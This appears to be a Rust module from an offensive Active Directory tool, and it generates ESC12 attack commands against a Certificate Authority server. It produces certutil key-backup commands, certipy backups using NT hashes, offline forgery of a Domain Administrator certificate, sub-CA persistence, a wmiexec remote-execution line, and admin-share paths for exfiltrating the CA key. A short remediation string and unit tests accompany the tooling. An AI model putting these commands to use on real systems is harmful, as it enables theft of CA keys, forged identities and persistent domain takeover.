//! ESC12 — Shell Access to ADCS CA Server
//!
//! ESC12 exploits the scenario where an attacker already has **code execution**
//! (shell access) on the CA server itself — typically via Pass-the-Hash,
//! WMIExec, PSExec, lateral movement, or a privileged service account.
//!
//! With shell access, the attacker can:
//!
//! 1. **Export the CA private key** — `certutil -backupKey <outdir>` or directly
//!    invoke the `ICertAdmin2` DCOM interface to backup the CA certificate + key.
//! 2. **Extract the DPAPI-protected CA key** from the `%SystemRoot%\System32\
//!    CertSvc\CertEnroll\` directory or from `%AllUsersProfile%\Microsoft\Crypto\RSA\`.
//! 3. **Forge arbitrary certificates** offline using the extracted CA signing key.
//! 4. **Persist as a sub-CA** by issuing a new subordinate CA certificate signed
//!    by the extracted root key.
//!
//! **Attack flow:**
//! ```text
//! Shell on CA → certutil -backupKey C:\Temp\cabackup → copy cabackup\*.p12 →
//! certipy ca -backup -ca corp-CA01 -username Admin -hashes <NTLM> →
//! forge any cert offline with the extracted CA key
//! ```
//!
//! Reference: SpecterOps "Certified Pre-Owned" (2021), ESC12 variant

use tracing::info;

// ─────────────────────────────────────────────────────────
//  Constants
// ─────────────────────────────────────────────────────────

/// Default CertSvc key storage path on the CA server
pub const CA_KEY_PATH: &str = r"%AllUsersProfile%\Microsoft\Crypto\RSA\MachineKeys";

/// Default backup output directory used in examples
pub const DEFAULT_BACKUP_DIR: &str = r"C:\Windows\Temp\cabackup";

// ─────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────

/// Configuration for ESC12 CA key extraction
#[derive(Debug, Clone)]
pub struct Esc12Config {
    /// CA server hostname / IP (for command generation)
    pub ca_host: String,
    /// CA common name
    pub ca_name: String,
    /// Privileged account available on the CA server
    pub operator_account: String,
    /// Path to write the backup on the CA server
    pub backup_path: String,
}

impl Default for Esc12Config {
    fn default() -> Self {
        Self {
            ca_host: "ca.corp.local".to_string(),
            ca_name: "corp-CA01".to_string(),
            operator_account: "Administrator".to_string(),
            backup_path: DEFAULT_BACKUP_DIR.to_string(),
        }
    }
}

/// Output of an ESC12 pre-exploitation assessment
#[derive(Debug, Clone)]
pub struct Esc12Assessment {
    /// Certutil backup command for the CA key
    pub certutil_backup_command: String,
    /// Certipy CA backup command
    pub certipy_command: String,
    /// Post-extraction offline forgery command
    pub offline_forgery_command: String,
    /// Persistence / sub-CA command
    pub sub_ca_command: String,
    /// Remediation recommendation
    pub remediation: String,
    /// File paths to check / exfiltrate on the CA server
    pub ca_key_paths: Vec<String>,
}

// ─────────────────────────────────────────────────────────
//  Exploiter
// ─────────────────────────────────────────────────────────

/// ESC12 exploiter — CA key exfiltration via shell access
pub struct Esc12Exploiter {
    config: Esc12Config,
}

impl Esc12Exploiter {
    /// Create a new ESC12 exploiter
    pub fn new(config: Esc12Config) -> Self {
        Self { config }
    }

    /// Generate exploitation guidance for ESC12.
    ///
    /// This method does NOT perform any live action.  It generates
    /// operator-ready commands and file paths based on the configuration.
    pub fn assess(&self) -> Esc12Assessment {
        info!(
            "ESC12: Generating CA key extraction guidance for CA '{}' @ {}",
            self.config.ca_name, self.config.ca_host
        );

        let certutil_backup_command = format!(
            "# On the CA server ({}) as {}:\n\
             certutil -backupDB {} && certutil -backupKey {}\n\
             # Then copy {} to your attacker host",
            self.config.ca_host,
            self.config.operator_account,
            self.config.backup_path,
            self.config.backup_path,
            self.config.backup_path,
        );

        let certipy_command = format!(
            "# From attacker host — certipy CA backup via DCOM:\n\
             certipy ca -backup -ca '{}' -target {} -u '{}' -hashes <NT_HASH>",
            self.config.ca_name, self.config.ca_host, self.config.operator_account,
        );

        let offline_forgery_command = format!(
            "# After extracting <ca_key.pfx>:\n\
             # Forge an arbitrary certificate (e.g. as Domain Admin):\n\
             certipy forge -ca-pfx <ca_key.pfx> -upn Administrator@{} -subject 'CN=Administrator'",
            self.config
                .ca_host
                .split('.')
                .skip(1)
                .collect::<Vec<_>>()
                .join("."),
        );

        let sub_ca_command = format!(
            "# Persist as sub-CA:\n\
             certipy ca -generate -ca '{}' -ca-pfx <ca_key.pfx> -template SubCA \
             -target {} -u '{}' -hashes <NT_HASH>",
            self.config.ca_name, self.config.ca_host, self.config.operator_account,
        );

        let ca_key_paths = vec![
            format!(
                r"\\{}\c$\Windows\System32\CertSrv\CertEnroll\",
                self.config.ca_host
            ),
            format!(
                r"\\{}\c$\ProgramData\Microsoft\Crypto\RSA\MachineKeys\",
                self.config.ca_host
            ),
            format!(
                r"\\{}\c$\Windows\System32\CertLog\",
                self.config.ca_host
            ),
        ];

        Esc12Assessment {
            certutil_backup_command,
            certipy_command,
            offline_forgery_command,
            sub_ca_command,
            remediation: format!(
                "Restrict CA server access:\n\
                 - Remove unnecessary local admin rights on {}\n\
                 - Enable Windows Defender Credential Guard\n\
                 - Monitor Event ID 4876 (CA backup initiated)\n\
                 - Audit who has 'Manage CA' rights\n\
                 - Consider HSM-backed CA keys to prevent software key export",
                self.config.ca_host
            ),
            ca_key_paths,
        }
    }

    /// Produce a minimal WMI exec command to run the certutil backup remotely
    /// (requires an authenticated session to the CA server).
    pub fn wmiexec_backup_command(&self) -> String {
        format!(
            "# Use overthrone's WmiExec to run certutil on the CA:\n\
             overthrone move wmiexec -t {} -u {} -c \
             'certutil -backupDB {path} -backupKey {path}'",
            self.config.ca_host,
            self.config.operator_account,
            path = self.config.backup_path,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_config() {
        let cfg = Esc12Config::default();
        assert!(!cfg.ca_name.is_empty());
        assert!(!cfg.ca_host.is_empty());
        assert_eq!(cfg.backup_path, DEFAULT_BACKUP_DIR);
    }

    #[test]
    fn test_assess_populates_commands() {
        let cfg = Esc12Config {
            ca_host: "10.0.0.20".to_string(),
            ca_name: "TestCA".to_string(),
            operator_account: "Admin".to_string(),
            backup_path: r"C:\Temp\backup".to_string(),
        };
        let exploiter = Esc12Exploiter::new(cfg);
        let assessment = exploiter.assess();

        assert!(assessment.certutil_backup_command.contains("TestCA") || 
                assessment.certutil_backup_command.contains("10.0.0.20"));
        assert!(assessment.certipy_command.contains("TestCA"));
        assert!(assessment.certipy_command.contains("10.0.0.20"));
        assert!(!assessment.ca_key_paths.is_empty());
        assert!(assessment.ca_key_paths[0].contains("10.0.0.20"));
    }

    #[test]
    fn test_wmiexec_backup_command_references_host() {
        let cfg = Esc12Config {
            ca_host: "172.16.0.5".to_string(),
            ca_name: "labCA".to_string(),
            operator_account: "svc_ca".to_string(),
            backup_path: r"C:\Temp\caout".to_string(),
        };
        let exploiter = Esc12Exploiter::new(cfg);
        let cmd = exploiter.wmiexec_backup_command();
        assert!(cmd.contains("172.16.0.5"));
        assert!(cmd.contains("certutil"));
    }
}
